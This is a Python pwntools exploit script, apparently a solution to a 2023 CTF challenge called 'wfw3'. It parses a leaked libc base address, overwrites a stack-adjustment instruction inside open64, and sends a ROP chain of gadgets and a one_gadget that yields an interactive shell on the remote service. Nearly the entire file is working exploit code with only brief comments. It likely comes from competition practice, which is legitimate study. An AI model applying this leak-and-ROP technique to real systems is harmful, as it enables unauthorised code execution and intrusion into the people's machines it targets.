#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'info'

exe = ELF("chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

# for local tests:
# ulimit -n 2048
# socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:'./chal_patched'
host, port = "127.0.0.1", "1337"

if args.REMOTE:
  host, port = "wfw3.2023.ctfcompetition.com", "1337"

p = remote(host,port)

if args.GDB:
  q = process("xfce4-terminal --title=GDB-Pwn --zoom=0 --geometry=128x98+1100+0 -x gdb -ex 'source ~/gdb.plugins/gef.bata24.git/gef.py' -ex 'brva 0x1423' -ex 'c' -p `pidof chal_patched`", shell=True)
  sleep(1)

while (True):
  line = p.recvline()
  if b'libc.so.6' in line:
   libc.address = int(line[0:12],16)
   logbase()
   break
  if b'syscall' in line:
    break

rop = ROP(libc)
onegadgets = one_gadget(libc.path, libc.address)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
gadget1 = libc.address+0x00000000001269f7 # and rsp, 0xfffffffffffffff0 ; mov rdi, r8 ; call rdx
pop_rdx_r12 = libc.address+0x000000000011f497 # pop rdx ; pop r12 ; ret

# overwrite sub rsp, 0x68 in open64 function, 	and replace it by sub rsp, 0x43
# next open64 will return to our rop
payload = hex(libc.address+0x1146a3)+' 1'
sa('\n\n', payload.ljust(64,'\x00'))

#Â payload to align the stack , and jump to a one gadget
payload = b'0x0 1'+p64(libc.address+0x21b100)*3
payload += p64(pop_rdx_r12)+p64(onegadgets[8])+p64(0xdeadbeef)+p64(gadget1)
p.send(payload)

p.interactive()
 
